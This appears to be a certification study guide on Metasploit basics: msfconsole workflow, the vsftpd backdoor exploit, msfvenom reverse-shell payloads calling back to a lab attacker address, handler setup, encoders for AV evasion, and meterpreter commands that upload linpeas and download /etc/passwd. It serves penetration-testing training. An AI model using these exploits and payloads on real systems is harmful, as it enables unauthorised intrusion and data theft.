# Metasploit Basics

> `01-Fundamentals/eJPT` · tools — INE-Cybersecurity-Certifications-Guide

Metasploit Framework (MSF) is an open-source exploitation platform maintained by
Rapid7. It ships preinstalled on Kali. For the eJPT you need the core workflow:
`msfconsole`, modules (exploit, auxiliary, payload, post), payload/handler basics,
and the integrated database.

## Core concepts

| Term | Meaning |
|---|---|
| `exploit` | Module that takes advantage of a specific vulnerability |
| `auxiliary` | Non-exploit module: scanners, fuzzers, brute force, DoS |
| `payload` | Code delivered by an exploit (reverse shell, meterpreter, bind shell) |
| `encoder` | Transforms a payload (historically used for evasion / bad chars) |
| `handler` | Listener that catches the connection from a reverse payload |
| `post` | Post-exploitation module run inside an existing session |

Payload names follow `<os>/<arch>/<type>/<connection>`, for example
`windows/x64/meterpreter/reverse_tcp` or `linux/x64/shell/reverse_tcp`.

## Start the framework and database

```bash
# Kali services: PostgreSQL is required for the MSF database
sudo systemctl enable --now postgresql

# One-time database initialization (creates the msf user/databases)
sudo msfdb init

# Launch the console (quiet mode skips the banner)
msfconsole -q
```

Inside the console, verify the DB connection:

```text
msf6 > db_status
[*] Connected to msf. Using connection type: postgresql

msf6 > workspace -a ejpt-lab     # create and switch to a workspace
msf6 > workspace                  # list workspaces
```

## The msfconsole workflow

The pattern for every module is: **search → use → show options → set → (check) → run**.

```text
# Find modules for a service or CVE
msf6 > search type:exploit platform:linux vsftpd
msf6 > search cve:2017-0144            # EternalBlue family
msf6 > search samba
msf6 > search type:auxiliary smb       # auxiliary modules too

# Load one and read about it
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

# Required options: RHOSTS (target), sometimes RPORT, LHOST/LPORT for payloads
msf6 exploit(...) > show options

msf6 exploit(...) > set RHOSTS 10.0.0.6
msf6 exploit(...) > set RPORT 21

# Set variables globally so payloads and handlers agree
msf6 exploit(...) > setg LHOST 10.0.0.5

# If the module supports it, verify the target first
msf6 exploit(...) > check

# Run it (foreground) or run as a background job
msf6 exploit(...) > run
msf6 exploit(...) > run -j            # background job, console stays usable
```

Note: modern MSF uses `RHOSTS` (older guides say `RHOST`). Setting payloads only
applies when the module supports them — some modules (like the vsftpd backdoor) yield a
shell directly with no payload required. Others need an explicit payload:

```text
msf6 exploit(...) > show payloads                # compatible payloads
msf6 exploit(...) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(...) > run
```

If you get a shell, return to the console with `background` (meterpreter) or `Ctrl+Z`
and manage sessions as shown below.

## Payloads and msfvenom

Generate standalone payloads (outside msfconsole) with `msfvenom`. Always set the
attacker IP (`LHOST`) to the interface the victim can actually reach.

```bash
# Linux reverse shell (stageless, all-in-one: filename has shell_reverse_tcp)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -f elf -o rev.elf

# Windows meterpreter reverse shell (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -f exe -o rev.exe

# PHP payload — check the output starts with <?php, add it if missing
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o rev.php
head -c 20 rev.php
```

**Staged vs stageless.** `meterpreter/reverse_tcp` is *staged*: a small first stage
downloads the rest — it needs a handler to complete the handshake. `meterpreter_reverse_tcp`
(underscore before `reverse`) is *stageless*: the whole payload travels in one piece and
is more robust when size is not a problem. `shell_reverse_tcp` above is stageless.

**Encoders.** Older courses teach `-e x86/shikata_ga_nai` to "evade AV". Most legacy encoders
are in **disuse** rather than removed: the framework still ships them and `x86/shikata_ga_nai`
carries no deprecation mark, but current AV engines fingerprint the well-known ones anyway.
Check what your version ships:

```bash
msfvenom -l encoders      # usually a small set these days
msfvenom -l payloads | grep windows
```

Treat encoding as a technique to test, never as a guaranteed bypass — and remember you
only need it for AV/IDS scenarios, which a default eJPT lab drill does not.

## Setting up a handler

A handler is a listener for your reverse payload. The generic one is
`exploit/multi/handler`:

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false   # keep listening afterwards
msf6 exploit(multi/handler) > exploit -j                # run as a background job
msf6 exploit(multi/handler) > jobs -l                   # list listener jobs
```

Everything must match the payload you generated: same payload type, same `LHOST`,
same `LPORT`. When the victim runs the file, a session appears.

## Database integration

Store scan results and reuse them across modules and sessions:

```text
msf6 > db_nmap -sV -p- -T4 10.0.0.6      # run nmap, store the results
msf6 > hosts                             # table of discovered hosts
msf6 > services                          # ports/services from db_nmap
msf6 > services -p 445 -c name,state     # filter columns
msf6 > vulns                             # vulnerabilities recorded
msf6 > creds                             # credentials found or added
msf6 > loot                              # files collected in sessions

# Import results from an external nmap run
msf6 > db_import /path/to/full.xml
```

`db_nmap` output flows into `hosts` and `services`, which you can then reference when
picking modules.

## Sessions and meterpreter

After a successful exploit you get a session. Meterpreter is MSF's in-memory
post-exploitation shell.

```text
msf6 > sessions -l                  # list sessions
msf6 > sessions -i 1                # interact with session 1
msf6 > sessions -k 1                # kill session 1
```

Useful meterpreter commands:

```text
meterpreter > sysinfo               # OS, architecture, hostname
meterpreter > getuid                # current user
meterpreter > getpid                # process id (see ps/migrate)
meterpreter > ps                   # list processes
meterpreter > migrate 1234          # move into another process (Windows)
meterpreter > shell                 # drop into a plain OS shell
meterpreter > upload /tmp/linpeas.sh /tmp/linpeas.sh
meterpreter > download /etc/passwd /root/loot/passwd
meterpreter > background            # send session to background
meterpreter > getuid
```

`Ctrl+Z` also backgrounds the current session.

## Resource scripts

Automate repetitive setup with `.rc` files (one msfconsole command per line,
`#` for comments):

```bash
# handler.rc
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

```bash
# Load it at startup or inside the console
msfconsole -q -r handler.rc
msf6 > resource handler.rc
```

## Common Mistakes & Tips

- **PostgreSQL not started / `msfdb` not initialized.** `db_status` fails and `db_nmap`
  errors. Fix with `sudo systemctl start postgresql` and `sudo msfdb init`.
- **Wrong `LHOST`.** `LHOST` must be the attacker IP the *victim* can reach — not
  `127.0.0.1`, not an unroutable address. Check `ip a` first.
- **Payload/target mismatch.** A Windows payload on a Linux box (or x64 payload on an
  x86 OS) fails. Confirm with `sysinfo` after your first shell and match arch/OS.
- **`LPORT` mismatch between payload and handler.** Generate the payload, then set the
  handler to the exact same port.
- **`ExitOnSession` left at default `true`.** The handler job stops after the first
  session. Set it `false` for multi-client drills.
- **Running `exploit` in the foreground** blocks the console. Use `exploit -j` and manage
  jobs/sessions.
- **Skipping `check`/`info`.** Verify the module matches the exact service version you
  enumerated; patched targets waste your time.
- **Forgetting `workspace` hygiene.** Use a fresh workspace per engagement
  (`workspace -a <name>`).
- **Staged payload with no working handler** produces a hanging connection. When in
  doubt, use a stageless payload.

## Checklist / Self-Test

- [ ] I can start PostgreSQL, run `msfdb init`, and confirm `db_status`.
- [ ] I can `search`, `use`, `show options`, `set`, and `run` a module.
- [ ] I can create a workspace and store `db_nmap` results in `hosts`/`services`.
- [ ] I can generate a reverse payload with `msfvenom` for Linux and Windows.
- [ ] I can start `exploit/multi/handler` with matching payload/LHOST/LPORT.
- [ ] I can explain staged vs stageless payloads.
- [ ] I can list, interact with, background, and kill sessions.
- [ ] I can capture a meterpreter session and run `sysinfo`, `getuid`, `shell`,
      `upload`, and `download`.
- [ ] I can write and load a resource `.rc` script.

> **Verification:** `msfconsole` and `msfvenom` are not installed here, so every invocation in this
> note is an unverified syntax reference. The encoder claim was checked against the upstream
> repository on 2026-09-19: `modules/encoders/` holds **57** encoder modules on `master` (24 under
> `x86`) and `x86/shikata_ga_nai.rb` is ranked *excellent* with no deprecation mark — in disuse, not removed.

## Further Resources

- Metasploit official documentation: <https://docs.metasploit.com/>
- Metasploit Framework source and wiki: <https://github.com/rapid7/metasploit-framework>
- OffSec Metasploit Unleashed (free course): <https://www.offsec.com/metasploit-unleashed/>
- Exploit-DB (public exploit search): <https://www.exploit-db.com/>
